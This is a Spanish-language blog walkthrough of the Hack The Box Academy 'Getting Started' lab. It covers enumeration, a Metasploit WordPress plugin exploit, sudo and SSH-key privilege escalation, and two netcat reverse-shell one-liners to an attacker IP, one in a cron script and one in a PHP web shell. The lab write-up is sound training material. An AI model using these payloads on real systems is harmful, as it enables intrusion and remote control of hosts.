---
layout: post
title: "Walkthrough: Getting Started"
date:  20-02-2026
categories: [Walkthroughs, HTB Academy]
tags: [nmap, gobuster, wpscan, Curl, Hashcat, ssh, Metasploit]
image: "assets/images/HTB_Academy_Getting_Started/featured_image.png"
alt: portada de Walkthrough Getting Started
---

En este post, te guiaré a través del módulo **Getting Started** de la plataforma **Hack The Box Academy**, resolviendo paso a paso todas las preguntas planteadas en el módulo y completando el Skill Assessment final.

¡Vamos a ello! 🚀

---

## Pentesting Basics

### Web Enumeration

**Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.**

Objetivo: 94.237.55.96:42619

En primer lugar hare un ping a la maquina objetivo para comprobar que puedo llegar a ella.

![alt text](../assets/images/HTB_Academy_Getting_Started/image.png)

Tras confirmar que esta accesible compruebo visualmente la web que carga en la maquina.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-1.png)

Realizo una enumeracion de descubrimiento con **gobuster** con el comando:

```sh
gobuster dir -u http://94.237.55.96:42619/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -q
```

Obtengo los siguientes resultados:

![alt text](../assets/images/HTB_Academy_Getting_Started/image-3.png)

Compruebo el directorio **`/wordpress`**

![alt text](../assets/images/HTB_Academy_Getting_Started/image-5.png)
Compruebo el fichero robots.txt que me indica que desactiva del escaneo el fichero **`admin-login-page.php`**

![alt text](../assets/images/HTB_Academy_Getting_Started/image-4.png)

Comrpeubo el fichero **`admin-login-page.php`** que me muestra una pagina de login, pero no tengo credenciales.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-7.png)

Compruebo el codigo fuente de la pagina mediante **`curl`**

```sh
curl http://94.237.55.96:42619/admin-login-page.php
```
Obtengo el codigo que reviso.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-6.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-8.png)

Veo que se han olvidado de borrar credenciales que estan harcodeadas en el codigo fuente.

Compruebo las credenciales en la pagina de login y obtengo la flag del ejercicio.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-9.png)

### Public Exploits

**Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)**

Objetivo: 94.237.59.180:54822

En primer lugar hare un ping a la maquina objetivo para comprobar que puedo llegar a ella.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-10.png)

A continuacion realizo una enumeracion de descubrimiento en la web que sirve la maquina:

```sh
gobuster dir -u http://94.237.59.180:54822/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -q
```

![alt text](../assets/images/HTB_Academy_Getting_Started/image-11.png)

Es la estructura tipica de un wordpress, por lo que realizo un escaneo del CMS con la herramienta **`wpscan`** añadiendo la deteccion de plugins de modo agresivo para que sea muy exaustivo.

```shell
wpscan --url http://94.237.59.180:54822/ --plugins-detection aggressive
```

![alt text](../assets/images/HTB_Academy_Getting_Started/image-12.png)

En la deteccion de plugins aparece el plugin **`simple-backup`**

![alt text](../assets/images/HTB_Academy_Getting_Started/image-13.png)

Busco exploits conocidos para **simple backup** con la herramienta **`searchsploit`** mediante el comando:

```sh
searchsploit simple backup
```

Aparece que el plugin en la version 2.7.11 tiene un exploit conocido.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-14.png)

Con el comando searchsploit -m 39883 hago una copia al directorio actual de exploit para poder leerlo

![alt text](../assets/images/HTB_Academy_Getting_Started/image-15.png)

Compruebo si en Metasploit existe el exploit para explotarlo con la herramienta.

```sh
msfconsole -q
search simple backup
use 0
show options
```

![alt text](../assets/images/HTB_Academy_Getting_Started/image-16.png)

Defino los parametros necesarios.

```sh
set RHOSTS 94.237.59.180
set RPORT 54822
set FILEPATH /flag.txt
```

y ejecuto con `exploit` y consigo la descarga de un fichero que sera una copia identica del fichero flag.txt

![alt text](../assets/images/HTB_Academy_Getting_Started/image-17.png)

Compruebo el contenido del fichero y obtengo la flag del ejercicio.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-18.png)

### Privilege escalation

**SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.**

**SSH to objetive with user "user1" and password "password1"**

Target(s): 94.237.55.238:50554 

Realizo la conexion mediante ssh a la maquina en el puerto que me indica el ejercicio con el usuario y clave que me suministran

```sh
ssh user1@94.237.55.238 -p 50554
```

![alt text](../assets/images/HTB_Academy_Getting_Started/image-19.png)

Una vez que he accedido a la maquina compruebo el entorno con el comando `ls` y `pwd` e intento acceder al fichero que me solicita el ejercicio sin obtener resultado positivo.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-20.png)

Para poder acceder al fichero tendre que hacer un movimiento lateral de usuario. Para ello compruebo los permisos que se hayan podido otorgar sobre algun binario al usuario user1 mediante el comando:

```sh
sudo -l
```

![alt text](../assets/images/HTB_Academy_Getting_Started/image-21.png)

el usuario user1 puede ejecutar /bin/bash como usuario user2 y obtener un shell como usuario user2. Lo realizo con el comando:

```sh
sudo -u user2 /bin/bash
```

Una vez tengo shell con el usuario user2 hago una lectura del contenido del fichero `flag.txt` que esta en la ruta `/home/user2/` y obtengo la flag del ejercicio.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-22.png)

**Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.**

Para esta parte del ejercicio me solicitan escalar privilegios desde user2 a root y acceder al fichero flag.txt que esta contenido en /root/

Compruebo si puedo acceder con los permisos actuales y al listar el contenido de root veo que el fichero flag.txt solo es escribible y leigible por el usuario root.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-23.png)

Al listar el contenido de /root/ tambien he encontrado la carpeta .ssh que suele contener las credenciales de acceso a ssh del usuario.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-24.png)

Compruebo el contenido de la carpeta .ssh y veo que los ficheros id_rsa (clave privada) y id_rsa.pub (clave publica) son legibles por cualquier usuario. 

Esto me va a permitir hacer un ataque en el cual copiar el contenido del fichero id_rsa y usare la credencial para entrar como root.

Con el comando cat obtengo el contenido completo de id_rsa y lo copio.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-25.png)

En mi maquina atacante creo el fichero **`my_id_rsa`** y pego el contenido de la credencial id_rsa copiada del usuario root de la maquina remota.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-26.png)

Cambio los permisos a 600 en mi credencial y realizo una conexion con usuario root y la credencial recien creada my_id_rsa

![alt text](../assets/images/HTB_Academy_Getting_Started/image-27.png)

Con esto consigo acceso como root a la maquina.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-28.png)

Compruebo el directorio /root/ y con el comando cat obtengo la flag del ejercicio.

![alt text](../assets/images/HTB_Academy_Getting_Started/image-29.png)

## Attacking Your First Box

### Nibbles - Enumeration

**Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)**

![alt text](../assets/images/HTB_Academy_Getting_Started/image-30.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-31.png)

### Nibbles - Initial Foothold

**Gain a foothold on the target and submit the user.txt flag**

curl http://10.129.80.105

![alt text](../assets/images/HTB_Academy_Getting_Started/image-32.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-33.png)

gobuster dir -u http://10.129.80.105/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/common.txt  -q

![alt text](../assets/images/HTB_Academy_Getting_Started/image-34.png)

curl http://10.129.80.105/nibbleblog/README

![alt text](../assets/images/HTB_Academy_Getting_Started/image-35.png)


![alt text](../assets/images/HTB_Academy_Getting_Started/image-36.png)


![alt text](../assets/images/HTB_Academy_Getting_Started/image-37.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-38.png)

set USERNAME admin
set PASSWORD nibbles
set TARGETURI /nibbleblog/
set RHOSTS 10.129.80.105
set LHOST 10.10.15.192

![alt text](../assets/images/HTB_Academy_Getting_Started/image-39.png)


![alt text](../assets/images/HTB_Academy_Getting_Started/image-40.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-41.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-42.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-43.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-44.png)

### Nibbles - Privilege Escalation

**Escalate privileges and submit the root.txt flag.**

![alt text](../assets/images/HTB_Academy_Getting_Started/image-45.png)

shell

python3 -c 'import pty;pty.spawn("/bin/bash")'   

![alt text](../assets/images/HTB_Academy_Getting_Started/image-46.png)


![alt text](../assets/images/HTB_Academy_Getting_Started/image-47.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-48.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-49.png)

I decide to append the reverse shell to the end of this file with:


echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.15.192 1234 > /tmp/f" >> monitor.sh


![alt text](../assets/images/HTB_Academy_Getting_Started/image-54.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-55.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-52.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-57.png)


![alt text](../assets/images/HTB_Academy_Getting_Started/image-56.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-58.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-60.png)


---

10.129.54.252

![alt text](../assets/images/HTB_Academy_Getting_Started/image-61.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-62.png)


gobuster dir -u http://10.129.54.252 -w /usr/share/seclists/Discovery/Web-Content/common.txt -q

![alt text](../assets/images/HTB_Academy_Getting_Started/image-63.png)

/admin               
        
      
         
/plugins              
/robots.txt           (Status: 200) [Size: 32]
/server-status        (Status: 403) [Size: 278]
/sitemap.xml          (Status: 200) [Size: 431]



/index.php 
![alt text](../assets/images/HTB_Academy_Getting_Started/image-64.png)


![alt text](../assets/images/HTB_Academy_Getting_Started/image-65.png)

/theme              
![alt text](../assets/images/HTB_Academy_Getting_Started/image-66.png)

/admin
![alt text](../assets/images/HTB_Academy_Getting_Started/image-67.png)
/backups     
![alt text](../assets/images/HTB_Academy_Getting_Started/image-68.png)
/data          
![alt text](../assets/images/HTB_Academy_Getting_Started/image-69.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-70.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-71.png)

```xml
<item>
    <USR>admin</USR>
    <NAME/>
    <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
    <EMAIL>admin@gettingstarted.com</EMAIL>
    <HTMLEDITOR>1</HTMLEDITOR>
    <TIMEZONE/>
    <LANG>en_US</LANG>
</item>
```

![alt text](../assets/images/HTB_Academy_Getting_Started/image-72.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-73.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-74.png)


![alt text](../assets/images/HTB_Academy_Getting_Started/image-75.png)


![alt text](../assets/images/HTB_Academy_Getting_Started/image-76.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-77.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-78.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-79.png)

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.192 7331 >/tmp/f"); ?>

![alt text](../assets/images/HTB_Academy_Getting_Started/image-80.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-81.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-83.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-82.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-84.png)

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+z 
stty raw -echo
fg
ENTER
ENTER
```

![alt text](../assets/images/HTB_Academy_Getting_Started/image-85.png)



![alt text](../assets/images/HTB_Academy_Getting_Started/image-86.png)

**After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag**

![alt text](../assets/images/HTB_Academy_Getting_Started/image-87.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-88.png)

```sh
cd /usr/bin/
CMD="/bin/sh"
sudo /usr/bin/php -r "system('$CMD');"
```

![alt text](../assets/images/HTB_Academy_Getting_Started/image-89.png)

![alt text](../assets/images/HTB_Academy_Getting_Started/image-90.png)